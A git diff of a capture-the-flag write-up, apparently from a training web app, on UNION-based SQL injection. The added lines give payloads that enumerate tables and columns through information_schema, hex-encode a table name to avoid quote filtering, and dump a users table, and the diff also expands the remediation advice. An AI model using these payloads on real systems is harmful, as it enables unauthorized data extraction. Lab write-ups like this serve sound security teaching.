@@ -11,17 +11,32 @@ which revealed that the query returns two columns.
 5 ORDER BY 3 --
 ```
 
-A `UNION SELECT` was then used to
-determine which column was reflected in the page output.
+Now I now that both columns are reflected anyways in the UI as 2 information are displayed the `First_name` and the `Surname`.
+
+Using the system database information_schema, which contains metadata about all databases, the tables belonging to the current database were enumerated.
 ```sql
--1 UNION SELECT 1, 2 --
+-1 UNION SELECT 1, group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema = database() --
 ```
 
-Once the injectable column was identified, it was possible to extract data from the
-database. By dumping the `Commentaire` column considered as non-sensitive by the
-application, a message containing instructions for generating the flag was discovered.
+This step revealed the presence of a table named users.
+
+Once the users table was identified, its columns were enumerated in order to locate potentially useful data.
 ```sql
--1 UNION SELECT 1, group_concat(Commentaire) FROM users --
+-1 UNION SELECT 1, group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name = 0x7573657273 --
+```
+The table name is represented in hexadecimal to avoid the use of quotes, which may be filtered.
+```bash
+echo -n users | xxd -p
+```
+This query revealed several columns, including user_id, first_name, last_name, town, country, planet, Commentaire, and countersign.
+
+Then I decided to see the content of each column by repeating this command:
+```sql
+-1 UNION SELECT 1, Commentaire from users
 ```
 
 ![instructions](image.png)
@@ -50,4 +65,7 @@ compromise, including data exfiltration, authentication bypass, and leakage of b
 logic.
 
 To prevent this issue, parameterized queries must be used, and database content should
-never be relied upon to store sensitive logic or secrets.
+never be relied upon to store sensitive logic or secrets. Validate input types and
+bounds at the API boundary (for example, `id` must be an integer), and return generic
+error messages so SQL details are not exposed. Use least-privilege database accounts and
+monitor suspicious query patterns to reduce impact if an injection attempt occurs.
